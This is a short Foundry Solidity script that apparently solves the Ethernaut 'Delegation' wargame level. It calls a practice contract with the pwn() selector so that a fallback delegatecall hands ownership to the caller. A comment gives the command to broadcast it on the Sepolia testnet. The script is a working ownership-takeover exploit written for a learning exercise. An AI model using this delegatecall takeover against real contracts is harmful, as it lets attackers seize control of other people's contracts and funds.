// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Delegation, Delegate} from "../src/level6.sol";

contract Level6Script is Script {
    function run(address instanceAddress) external {
        Delegation target = Delegation(instanceAddress);

        vm.startBroadcast();
        (bool success,) = address(target).call(abi.encodeWithSelector(Delegate.pwn.selector));
        require(success, "Delegate call failed");
        vm.stopBroadcast();
        address newOwner = target.owner();
        console.log("newOwner: ", newOwner);
    }
}
//forge script script/level6.s.sol:Level6Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account yourkey --sig "run(address)" your instance address
